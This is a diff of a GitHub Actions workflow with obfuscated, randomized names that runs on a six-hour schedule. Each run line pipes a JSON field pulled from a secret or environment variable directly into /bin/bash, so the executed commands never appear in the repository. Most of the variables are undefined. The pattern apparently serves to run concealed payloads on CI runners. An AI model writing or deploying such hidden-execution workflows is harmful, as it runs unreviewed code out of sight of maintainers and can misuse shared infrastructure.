@@ -1,8 +1,10 @@
 name: anzaidong1887
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
+    - cron: '24 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          a0: ${{ secrets.a0 }}
+          bwpa92: ${{ secrets.bwpa92 }}
         run: |
-          echo $a0 | jq -r .dd96419 | /bin/bash
-          echo $qgg0757 | jq -r .zxk399 | /bin/bash
-          echo $u01 | jq -r .x39 | /bin/bash
-          echo $zphwf8 | jq -r .qdcf4 | /bin/bash
-          echo $cq614 | jq -r .efjh9068 | /bin/bash
-          echo $j1294 | jq -r .xexj5 | /bin/bash
-          echo $lspy8 | jq -r .nqsc35695 | /bin/bash
+          echo $bwpa92 | jq -r .vd641 | /bin/bash
+          echo $kbnz6449 | jq -r .x99269 | /bin/bash
+          echo $eeh58 | jq -r .zsvpu3 | /bin/bash
+          echo $qmah79 | jq -r .khk5 | /bin/bash
+          echo $glr77 | jq -r .qt8 | /bin/bash
+          echo $ghxaj05 | jq -r .ghkhr20 | /bin/bash
+          echo $qxnmv8710 | jq -r .t57 | /bin/bash
+          echo $sgrk5805 | jq -r .l5 | /bin/bash
 
